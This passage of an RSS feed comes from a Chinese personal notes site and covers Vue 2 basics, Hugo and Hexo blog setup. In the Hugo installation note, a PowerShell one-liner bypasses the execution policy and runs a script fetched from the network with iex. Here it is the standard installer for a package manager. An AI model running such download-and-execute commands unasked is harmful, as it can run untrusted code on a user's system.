&amp;lt;a @click.prevent.stop=&amp;#34;btn&amp;#34; href=&amp;#34;https://ke.qq.com/&amp;#34;&amp;gt;123&amp;lt;/a&amp;gt; stop 阻止元素的事件冒泡。
once 事件只触发一次
capture 使用事件的捕获模式
self 只有 event.target 是当前操作的元素时，才触发该事件
&amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;!--因为触发事件冒泡 target 不是 div，而是 button--&amp;gt;  &amp;lt;!--所以点击 button 不会触发事件冒泡--&amp;gt;  &amp;lt;div @click.self=&amp;#39;showInfo2&amp;#39;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; passive 事件的默认行为立即执行，无需等待事件的回调执行完毕</description>
    </item>
    
    <item>
      <title>Vue 注入</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</guid>
      <description>注入 配置的实例对象中的部分内容会被提取到 Vue 实例中：
 data:{} methods: {}  该过程称之为注入，注入的目的有两个：
完成数据响应式 Vue 是如何知道数据被更改的？
vue 2.0，是通过object.defineProperty()完成的数据响应式。该方法有很多缺陷，比如我们新增或删除data中的属性，此时的页面会无法正常响应。
vue 3.0，是通过 Class proxy。
绑定 this 通过 bind()来改变 this 的指向。</description>
    </item>
    
    <item>
      <title>Vue 组件化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</guid>
      <description>组件化 将页面按照功能细分为若干个区域，每一个区域就是一个组件，每个组件包含：
 功能（JS） 内容（模板） 样式（CSS）  组件 用来实现局部（特定）功能效果的代码集合。
组件与 Vue 实例的区别：
 无el。 data 必须是一个函数，该函数返回的对象作为数据。 由于没有el，组件的虚拟DOM 树必须定义在template 或 render()中。  非单文件组件 一个文件中包含 N 个组件。
单文件组件 一个文件中只包含 1 个组件。
作用 复用编码、简化项目编码、提高运行效率。
定义组件 // 定义组件 var Title = { 	template: `&amp;lt;h1&amp;gt;标题&amp;lt;/h1&amp;gt;`, }; var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 组件化和模块化的区别</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96%E5%92%8C%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96%E5%92%8C%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>组件化和模块化的 </description>
    </item>
    
    <item>
      <title>Vue 虚拟 DOM 树</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</guid>
      <description>虚拟 DOM 树 它是一个普通的对象，对应着真实的 DOM 树；虚拟 DOM 树的节点都是虚拟的节点。
为了提高效率，vue 会把模板编译成为虚拟 DOM 树，然后生成真实 DOM 树。
因为浏览器如果直接修改真实的 DOM 树，这是非常影响效率的，但如果修改一个对象，那么效率是非常高的。
数据响应式 当数据更改时，会将更改后的内容编译成一棵新的虚拟 DOM 树，然后将其与旧的虚拟 DOM 树比对（diff算法），仅将两棵虚拟 DOM 属有差异的节点渲染为真实 DOM 树，没有差异的节点则直接使用旧虚拟 DOM 树所对应的真实 DOM 树上的节点（复用）。这样可最小程度的改动真实 DOM，提升页面渲染效率。
因此，对于 Vue 而言，提升效率重点在于两个方面：
  减少新的虚拟 DOM 的生成。
  保证虚拟 DOM 树对比之后，只有必要的节点发生变化。
  如何生成虚拟 DOM 树 生成虚拟 DOM 树的方式：
 在挂载的元素内部直接书写，此时使用元素的outerHTML作为模板。优先级最低。 在template配置中书写,，它是一个模板字符串。优先级比第一种方式高。 在render()中直接创建虚拟节点树，此时，完全脱离模板，这会省略将模板编译为虚拟 DOM 树的步骤。优先级最高。  使用render()循环创建 1—6 级标题：
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	render(t) { 	var titles = []; 	for (var i = 1; i &amp;lt;= 6; i++) { 	titles.</description>
    </item>
    
    <item>
      <title>Vue</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue/</guid>
      <description>Vue Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。
它主要解决了前端开发中的核心痛点 —— 复杂的 DOM 操作。
特点 渐进式 可以只将网站中的一个页面或网站中的某一个区域使用 Vue 来开发。当然，也可以整个网站都用 Vue 来开发。
组件化 采用组件化开发模式，将一个复杂的网站，简化为一个个的组件，独立开发，能提高代码复用率，且让代码更好维护。
响应式 数据响应式，即后台数据（model）发生变化，前台的内容（View），也会相应的变化。
其他 不在使用传统的命令式编码，在Vue中，使用声明式编码，让我们无需直接操作 DOM，提高开发效率。
. 使用虚拟 DOM + 优秀的 Diff 算法，尽量复用 DOM 节点。
Vue 应用场景 前台部分页面，用户看到的网站页面。
中台全部页面，网站给某些额非官方人员提供的管理页面。比如淘宝卖家的管理后台等。
后台全部页面，网站官方的后台管理页面。</description>
    </item>
    
    <item>
      <title>Vue 实例</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</guid>
      <description>Vue 实例 new 一个 Vue 实例，并将其赋给一个配置对象 ：
var vm = new Vue({}) 该配置对象vm中有非常多的属性，大部分属性都是以$和_开头，这是为了避免与我们定义的属性重名。
以$开头的属性，都是供开发者使用的；而以_开头的属性，是内置属性，不供我们使用。</description>
    </item>
    
    <item>
      <title>使用 Vue</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</guid>
      <description>使用 Vue  引入 Vue.js。  本地 js 文件。 Vue CDN。   脚手架。  官方脚手架vue-cli。 其他民间脚手架，如webpack-simple。 手动搭建，灵活性高。    我的第一个 Vue 程序 创建 Vue 实例，并传给一个配置对象。
root 容器里的代码被称为 Vue 模板，模板中是插值语法{{}}，其中只能写 JavaScrip 表达式。
一个 Vue 实例，只能控制一个容器，它们之间只能一一对应。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;   &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;!</description>
    </item>
    
    <item>
      <title>Hugo 命令</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Fri, 22 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%91%BD%E4%BB%A4/</guid>
      <description>Hugo 命令 hugo new site MyBlog 创建一个新的站点文件夹
hugo new Article/first.md hugo -t ThemeName hugo -D 构建静态页面</description>
    </item>
    
    <item>
      <title>Hugo 安装</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%AE%89%E8%A3%85-hugo-/</link>
      <pubDate>Fri, 22 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%AE%89%E8%A3%85-hugo-/</guid>
      <description>Hugo 安装 源码编译安装，首先安装好依赖的工具
 Git Mercurial Go 1.3+ (Go 1.4+ on Windows)  我的环境是 windows，选择的安装方法是Chocolatey (Windows)，步骤如下：
 用管理员身份打开 windows 中的Windows PowerShell（命令提示符）。（windows 中搜索 powershell，右键“用管理员身份运行”） 复制下方代码，然后执行  Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(&amp;#39;https://chocolatey.org/install.ps1&amp;#39;))  输入 choco，查看是否安装成功。 复制下方代码，然后执行  choco install hugo -confirm </description>
    </item>
    
    <item>
      <title>博客添加搜索功能</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
      <pubDate>Fri, 22 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hugo/%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
      <description>博客添加搜索功能 HTML 代码 然后在网页内需要添加搜索栏的合适位置添加以下代码，一般放在顶部导航栏：
&amp;lt;div class=&amp;#34;search&amp;#34;&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-start&amp;#34;&amp;gt;search&amp;lt;/i&amp;gt; 	&amp;lt;input type=&amp;#34;text&amp;#34; class=&amp;#34;search-input&amp;#34; placeholder=&amp;#34;Searching...&amp;#34; /&amp;gt; 	&amp;lt;i class=&amp;#34;material-icons search-icon search-clear&amp;#34;&amp;gt;clear&amp;lt;/i&amp;gt; 	&amp;lt;div class=&amp;#34;search-results&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; 上面的clear是一个清除输入框内容的图标，search-results是用于输出匹配到的结果的板块；
CSS 代码 .search { 	position: relative; 	height: 30px; 	text-align: right; 	line-height: 30px; 	padding-right: 10px; }  .search .search-icon { 	float: right; 	height: 100%; 	margin: 0 10px; 	line-height: 30px; 	cursor: pointer; 	user-select: none; }  .</description>
    </item>
    
    <item>
      <title>Hexo 将博客作为站点子页面</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</guid>
      <description>Hexo 将博客作为站点子页面 前言 如果你想如何在 GitHub 的 repository 中上传自己写的网页作为首页，hexo 生成的博客页作为其子页？即自己写的页面作为 UserName.github.io 的页面，将 hexo 博客放在 UserName.github.io/blog 上，那么，这个教程也许可以帮到你。
本教程的前提是你已经用 hexo 将博客搭建在 UserName.github.io 的仓库上了。
新建仓库 在 github 上新建一个仓库，名字随意，我的是 Blog。
然后本地初始化一个 master 分支，并且将原仓库 clone 到本地分支，并且 开启仓库的 GitHub Pages.，需要注意的是，这里的本地分支目前是没有 CNAME 文件 的。
修改 Hexo 的配置文件 打开配置文件 _config.yml，找到 #URL 下的 url 和 root，将 url 修改为https:// UesrName.github.io/新建的仓库名（我这里是 Blog），然后将 root 修改为**/新建的仓库名/**。
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.</description>
    </item>
    
    <item>
      <title>Hexo 搭建博客</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
      <description>Hexo 搭建博客 创建 Github 仓库 注册一个Github账号 创建 Github Repository 在 Github 上创建一个仓库，仓库名必须为 UserName.github.io，注意，这是固定的写法 。
将 Git 与 Github 关联 下载并安装Git 配置个人信息 git config --global user.name &amp;#34;Your UserName&amp;#34; git config --global user.email &amp;#34;YourEmail@qq.com&amp;#34; 生成 ssh 密钥文件 hexo d 到远程仓库，因为每一台电脑中的私钥只有只有一个，因此当你想给另一个 github 账号配置博客时，必须重新生成公钥和私钥
ssh-keygen -t rsa -C &amp;#34;Your GitHub 的邮箱&amp;#34; 复制 id_rsa pub 文件中的密钥 三个回车，默认不需要设置密码，之后到所显示的路径中找到生成的 ssh 的文件夹中的 id_rsa pub 密钥，将其中内容全部复制
new SSH Key 打开你的 Github 的主页，点击头像，选择 Settings，再选择 SSH and GPG keys，找到 SSH keys，点击 New SSH Key，Title 为标题，任意填写，将刚刚复制的 id_rsa pub 文件中的密钥文本粘贴进去，最后 Add SSH key。</description>
    </item>
    
    <item>
      <title>Hexo 更改博客主题</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</guid>
      <description>Hexo 更改博客主题 前言 配置完了 Hexo，你是否对自带的主题不满意呢？本篇文章将教你如何更改及美化 Hexo 主题。
下载主题 去 Hexo 的Hexo Themes下载一个你认为不错的主题。这里推荐 Next主题
更改基本站点信息 在你的博客根目录下打开**_config.yml**，将 Site 下的信息改为你自己的
# Site title: Rainy 的梦呓 subtitle: &amp;#39;至简&amp;#39; description: &amp;#39;My Blog And Note to sum up&amp;#39; keywords: Blog note author: Yxz language: zh-CN timezone: &amp;#39;Asia/Shanghai&amp;#39; 同时 记得将 URL 下的 url 改为你自己的站点地址
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.github.io/project&amp;#39; url: https://YxzRainy.github.io/Blog 切换到 Next 主题 在你的博客根目录下打开**_config.</description>
    </item>
    
  </channel>
</rss>
